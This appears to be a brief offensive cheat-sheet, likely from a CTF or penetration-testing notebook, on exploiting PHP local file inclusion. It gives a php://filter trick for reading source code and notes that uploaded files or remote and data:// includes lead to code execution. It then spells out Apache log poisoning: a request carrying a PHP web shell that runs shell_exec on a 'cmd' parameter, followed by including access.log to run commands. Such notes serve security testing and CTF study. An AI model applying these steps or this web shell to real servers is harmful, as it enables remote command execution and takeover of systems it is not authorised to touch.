When the PHP code uses `include` with a user-controlled path.
## Getting source code of filr
Use `php://filter/convert.base64-encode/resource=path`, will base64 encode it so it won't be parsed as PHP.
## To RCE
The idea is to include a file with content we control.
### Through file upload or control paths
- If you can upload a file, then include it, you won.
- If you can use internet (`https://`) or `data://` paths, you won.
### Through apache log files
If you can include `/var/log/apache2/access.log`
Make a request to `http://1.2.3.4/<?php echo '####'; echo shell_exec($_GET['cmd']); ?>`
Then do a local file inclusion to `/var/log/apache2/access.log` with `cmd=ls`, and ctrl+f to `####`.
Probably should end commands with `| base64` so html/php formatting don't mess up the output.